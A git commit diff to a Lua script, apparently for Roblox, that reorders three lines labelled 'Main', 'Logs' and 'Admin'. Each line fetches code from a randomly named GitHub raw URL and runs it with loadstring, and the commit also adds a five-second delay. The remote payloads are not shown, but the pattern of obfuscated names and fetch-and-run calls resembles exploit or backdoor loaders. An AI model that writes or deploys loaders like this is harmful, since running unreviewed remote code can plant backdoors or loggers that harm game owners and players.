b2aabc07ac1f5f9cf71e7b12b728440150d2a148
fdsmogk <121389294+fdsmogk@users.noreply.github.com>
2023-01-12 17:56:29 +0500

    Update lllalallala.lua

--- lllalallala.lua
+++ lllalallala.lua
@@ -1,8 +1,9 @@
+--Main
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/aehtnpopoaoerjpofehnajpo225236/main/hreajettsrka4658846545969", true))()
+
 --Logs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()
 
 --Admin
+wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/sgzhdsxhsrt6745745joinijodnoizsd25/main/sdhdfjherajserk6346347cdzs", true))()
-
---Main
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/aehtnpopoaoerjpofehnajpo225236/main/hreajettsrka4658846545969", true))()
